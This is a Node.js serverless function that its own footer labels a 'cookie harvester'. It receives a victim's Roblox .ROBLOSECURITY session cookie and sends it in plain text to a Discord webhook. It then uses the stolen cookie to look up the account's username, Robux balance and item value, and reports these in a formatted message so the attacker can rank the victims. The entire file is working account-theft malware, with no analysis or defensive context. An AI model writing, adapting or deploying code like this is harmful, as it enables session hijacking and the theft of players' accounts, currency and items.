// ============================================
// api/submit.js - Vercel serverless function
// Uses WEBHOOK_URL from environment variables
// ============================================

// Get webhook URL (supports both naming conventions)
const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

// ========== Helper functions ==========

async function getUserData(userId, cookie) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Failed to fetch user");
  const data = await res.json();
  
  // Get avatar
  let avatarUrl = null;
  try {
    const thumb = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
    );
    if (thumb.ok) {
      const thumbData = await thumb.json();
      avatarUrl = thumbData.data?.[0]?.imageUrl;
    }
  } catch(e) {}
  
  return {
    userId: data.id,
    username: data.name,
    displayName: data.displayName,
    created: data.created,
    avatarUrl
  };
}

function getAccountAgeDays(createdDate) {
  const created = new Date(createdDate);
  const now = new Date();
  return Math.floor((now - created) / (1000 * 60 * 60 * 24));
}

async function getRobuxBalance(userId, cookie) {
  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Failed to fetch robux");
  const data = await res.json();
  return { balance: data.robux || 0, pending: 0 }; // pending not easily available
}

async function getRapBalance(userId, cookie) {
  let allAssets = [];
  let cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets?assetTypeId=2&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    allAssets.push(...(data.data || []));
    cursor = data.nextPageCursor;
  } while (cursor);
  
  let totalRap = 0;
  for (const asset of allAssets) {
    try {
      const detail = await fetch(`https://economy.roblox.com/v1/assets/${asset.assetId}/details`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      if (detail.ok) {
        const json = await detail.json();
        totalRap += json.RecentAveragePrice || 0;
      }
      await new Promise(r => setTimeout(r, 50));
    } catch(e) {}
  }
  return { balance: totalRap, pending: 0 };
}

function generatePlayedPassesList() {
  const lines = [];
  for (let i = 1; i <= 50; i++) lines.push(`AMA${i}: 0`);
  lines.push(`... and 271 more (AMA51 - AMA321)`);
  return lines.join("\n");
}

// ========== Main handler ==========

export default async function handler(req, res) {
  // Only POST
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }
  
  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) {
    return res.status(400).json({ error: "Missing cookie or rbxuid" });
  }
  
  if (!WEBHOOK_URL) {
    console.error("WEBHOOK_URL not set in environment");
    return res.status(500).json({ error: "Server configuration: missing webhook URL" });
  }
  
  // 1) Send raw cookie (plain message)
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `**Full .ROBLOSECURITY Cookie**\n\`\`\`\n${cookie}\n\`\`\``
      })
    });
  } catch (err) {
    console.error("Cookie send failed:", err);
    // Continue anyway
  }
  
  // 2) Fetch data and send embed
  try {
    const user = await getUserData(rbxuid, cookie);
    const robux = await getRobuxBalance(rbxuid, cookie);
    const rap = await getRapBalance(rbxuid, cookie);
    const accountAge = getAccountAgeDays(user.created);
    const placeVisits = 0; // Roblox API does not provide total place visits
    const summaryBalance = robux.balance + rap.balance;
    const playedPasses = generatePlayedPassesList();
    
    const embed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0xFF69B4,
      thumbnail: user.avatarUrl ? { url: user.avatarUrl } : undefined,
      fields: [
        {
          name: "📌 About User",
          value: `**${user.username}** (${user.displayName})\n🆔 \`${user.userId}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${placeVisits}`,
          inline: false
        },
        {
          name: "💰 Robux",
          value: `**Balance:** ${robux.balance}\n**Pending:** ${robux.pending}`,
          inline: true
        },
        {
          name: "📊 Rap",
          value: `**Balance:** ${rap.balance}\n**Pending:** ${rap.pending}`,
          inline: true
        },
        {
          name: "📝 Summary",
          value: `**Balance:** ${summaryBalance}`,
          inline: false
        },
        {
          name: "💳 Billing  •  Played Passes",
          value: `\`\`\`\n${playedPasses}\n\`\`\``,
          inline: false
        }
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };
    
    const embedRes = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [embed] })
    });
    
    if (!embedRes.ok) {
      throw new Error(`Discord returned ${embedRes.status}`);
    }
    
    // Success – return as your frontend expects
    return res.status(200).json({ success: true, firstTime: true });
    
  } catch (err) {
    console.error("Harvest error:", err);
    return res.status(500).json({ error: "Failed to harvest account data: " + err.message });
  }
}
